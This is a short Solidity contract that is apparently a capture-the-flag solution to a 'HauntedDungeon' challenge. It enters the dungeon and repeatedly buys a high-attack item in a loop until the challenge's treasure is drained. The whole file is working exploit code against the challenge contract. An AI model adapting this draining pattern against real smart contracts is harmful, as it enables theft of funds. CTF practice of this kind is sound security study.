pragma solidity 0.8.4;

import './Setup.sol';
import 'hardhat/console.sol';

contract Exploit {
    HauntedDungeon challenge;
    constructor(HauntedDungeon _challenge) payable {
        challenge = _challenge;
    }

    /*
                L  A  D   E
    lifePotion  4  0  0  0.6
    dmgPotion   0  4  0  1.2
    defPotion   0  0  2  0.6
    leechBlood -2  0  8  0.45
    mntnDew    -2 12 -4  0.2
    */

    function exploit() public {
        challenge.enterDungeon{value: 0.5 ether}();

        while (challenge.treasure() != 0)
        {
            uint buys = challenge.storeAccessLimit(address(this));
            for (uint i = 0; i < buys; i++)
            {
                challenge.store{value: 0.2 ether}("mntnDew");
            }
            int lives = challenge.lives(address(this));
            challenge.turn();
        }
    }

    fallback() external payable {

    }
}